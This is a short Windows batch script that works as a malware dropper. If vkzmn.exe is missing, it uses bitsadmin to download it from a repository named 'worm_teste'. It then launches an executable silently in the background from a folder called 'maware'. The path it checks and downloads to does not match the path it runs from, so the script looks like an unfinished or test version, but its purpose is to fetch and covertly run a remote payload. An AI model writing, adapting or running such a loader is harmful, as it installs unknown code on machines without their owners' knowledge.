@echo off


if  exist   C:\users\public\vkzmn.exe     (

start /b  C:\Users\MPC\maware\vkzmn.exe      

)else (

bitsadmin /transfer job   https://codeberg.org/atilalogical/worm_teste/raw/branch/main/vkzmn.exe    C:\users\public\vkzmn.exe
 
start /b  C:\Users\MPC\maware\vkzmn.exe


)




